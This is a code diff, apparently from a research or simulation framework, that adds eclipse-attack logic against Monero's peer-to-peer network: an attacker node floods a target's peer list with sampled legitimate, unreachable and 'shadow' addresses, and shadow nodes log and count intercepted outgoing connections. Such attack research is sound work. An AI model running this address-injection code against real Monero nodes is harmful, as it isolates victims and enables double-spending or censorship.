@@ -178,6 +178,19 @@ void MoneroNodePrimitives::OpAfterRecv(int data_fd, string recv_str) {
                         typedef nodetool::COMMAND_TIMED_SYNC_T<cryptonote::CORE_SYNC_DATA> COMMAND_TIMED_SYNC;
                         typedef COMMAND_TIMED_SYNC::request t_req;
                         typedef COMMAND_TIMED_SYNC::response t_resp;
+                        cout << "Received COMMAND_TIMED_SYNC_T message"
+                             << ", NodeIP:" << GetIP() << "\n";
+
+                        if (_type == NodeType::Shadow && !_informed) {
+
+                            // print attack success message
+                            cout
+                                    << "Interception of target node's outgoing connection is confirmed"
+                                    << ", Shadow NodeIP:" << GetIP() << "\n";
+                            // update attack statistics
+                            _attackStat->IncrementHijackedOutgoingConnNum();
+                            _informed = true;
+                        }
 
                         boost::value_initialized<t_req> in_struct = parse_rawstream_into_struct<t_req>(buff_to_invoke);
 
@@ -195,9 +208,11 @@ void MoneroNodePrimitives::OpAfterRecv(int data_fd, string recv_str) {
                         rsp.payload_data.pruning_seed = 0;
 
                         if (_type == NodeType::Attacker) {
-                            // add peer information
-                            nodetool::peerlist_entry ple = create_peerlist_entry("3.0.0.1", 28080);
-                            rsp.local_peerlist_new.push_back(ple);
+                            if (_addr_ip_list.size() > 0) {
+                                for (auto &ple : _addr_ip_list)
+                                    rsp.local_peerlist_new.push_back(ple);
+                                _addr_ip_list.clear();
+                            }
                         }
 
                         return_buff = get_msgstr_from_struct(rsp, P2P_COMMANDS_POOL_BASE + 2, LEVIN_PACKET_RESPONSE);
@@ -339,13 +354,18 @@ void MoneroNodePrimitives::OpAddrInjectionTimeout(std::chrono::system_clock::dur
 
     if (now < attack_start_time) {
         // if it's prepare phase
-        int totalIPCount = 1;
+        int totalIPCount = 1000;
         int legiIPcount = totalIPCount * 0.3;
         int unreLegiIPcount = totalIPCount * 0.7;
 
-        nodetool::peerlist_entry ple = create_peerlist_entry("3.0.0.1", 28080);
-        _addr_ip_list.push_back(ple);
-
+        legiIPcount = min(legiIPcount, (int) vReachableIP.size());
+        unreLegiIPcount = min(unreLegiIPcount, (int) vUnreachIP.size());
+        if (!vReachableIP.empty())
+            sample(vReachableIP.begin(), vReachableIP.end(), back_inserter(vAddr), legiIPcount,
+                   mt19937{random_device{}()});
+        if (!vUnreachIP.empty())
+            sample(vUnreachIP.begin(), vUnreachIP.end(), back_inserter(vAddr), unreLegiIPcount,
+                   mt19937{random_device{}()});
     } else {
         // if it's attack phase
         int totalIPCount = std::min(1000, (int) (periodLength * ipPerSec));
@@ -353,12 +373,32 @@ void MoneroNodePrimitives::OpAddrInjectionTimeout(std::chrono::system_clock::dur
         int unreLegiIPcount = totalIPCount * (1 - shadowRate) * 0.7;
         int shadowIPcount = totalIPCount * shadowRate;
 
+        legiIPcount = min(legiIPcount, (int) vReachableIP.size());
+        unreLegiIPcount = min(unreLegiIPcount, (int) vUnreachIP.size());
+        shadowIPcount = min(shadowIPcount, (int) vShadowIP.size());
+
+        if (!vReachableIP.empty())
+            std::sample(vReachableIP.begin(), vReachableIP.end(), std::back_inserter(vAddr), legiIPcount,
+                        std::mt19937{std::random_device{}()});
+        if (!vUnreachIP.empty())
+            std::sample(vUnreachIP.begin(), vUnreachIP.end(), std::back_inserter(vAddr), unreLegiIPcount,
+                        std::mt19937{std::random_device{}()});
+        if (!vShadowIP.empty())
+            std::sample(vShadowIP.begin(), vShadowIP.end(), std::back_inserter(vAddr), shadowIPcount,
+                        std::mt19937{std::random_device{}()});
+        std::cout << "debug print start (attack phase)" << "\n";
+        std::cout << "legiIPcount:" << legiIPcount << ", unreachable legiIPCount:" << unreLegiIPcount
+                  << ", shadowIPcount:" << shadowIPcount << "\n";
     }
 
     // assume a single data socket
     assert(_mTCPControl.size() == 1);
     int data_fd = _mTCPControl.begin()->first;
 
-    // Create a ADDR message for `vIP`,
-    // then push it to message queue
+    // append to addr peerlist
+    _addr_ip_list.clear();
+    for (std::string ip : vAddr) {
+        nodetool::peerlist_entry ple = create_peerlist_entry(ip, 28080);
+        _addr_ip_list.push_back(ple);
+    }
 }
